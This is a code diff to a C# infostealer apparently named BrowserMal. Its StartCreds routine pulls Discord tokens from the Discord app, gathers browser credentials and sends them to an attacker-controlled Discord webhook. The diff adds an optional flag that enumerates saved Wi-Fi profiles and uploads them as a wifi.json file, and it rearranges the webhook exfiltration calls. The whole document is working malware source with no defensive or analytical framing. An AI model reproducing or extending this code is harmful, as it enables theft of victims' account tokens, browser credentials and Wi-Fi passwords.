@@ -16,8 +16,11 @@ namespace BrowserMal
         private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
         private static readonly Dictionary<string, string> list = new Dictionary<string, string>();
 
-        public static void StartCreds(string discordWebhook)
+        public static void StartCreds(string discordWebhook, bool extractWifi = false)
         {
+            if (string.IsNullOrEmpty(discordWebhook))
+                return;
+
             browserManager.Init();
             List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
 
@@ -30,7 +33,7 @@ namespace BrowserMal
             DiscordManager discordManager = new DiscordManager();
             List<BrowserModel> discordPaths = discordManager.GetDiscordLocations();
 
-            List<string> discordsTokensBrowser = discordManager.Init(ref browsersChromium, ChromiumUtil.LOCAL_STORAGE);
+            //List<string> discordsTokensBrowser = discordManager.Init(ref browsersChromium, ChromiumUtil.LOCAL_STORAGE);
 
             DiscordManager.Encrypted = true;
             List<string> discordTokensApp = discordManager.Init(ref discordPaths, ChromiumUtil.LOCAL_STORAGE);
@@ -38,15 +41,15 @@ namespace BrowserMal
             CreateSimpleDiscordMessage(discordWebhook, string.Join(", ", discordTokensApp.ToArray()));
             //Extration();
 
-            Wifi.Enumerate enumerate = new Wifi.Enumerate();
-
-            if (!string.IsNullOrEmpty(discordWebhook))
+            if (extractWifi)
             {
-                //CreateSimpleDiscordMessage(discordWebhook, sb.ToString());
-                DiscordExtration(discordWebhook);
+                Wifi.Enumerate enumerate = new Wifi.Enumerate();
                 Webhook.SendFile(enumerate.Start(), discordWebhook, "wifi.json");
-                CreateDiscordMessage(discordWebhook);
             }
+
+            //CreateSimpleDiscordMessage(discordWebhook, sb.ToString());
+            DiscordExtration(discordWebhook);
+            CreateDiscordMessage(discordWebhook);
 
             //Filesaver.FileManager.SaveBytes(@"", Zip.ZipArchives(list));
             //ProcessUtil.KillProcessDelayed(1, "powershell.exe");
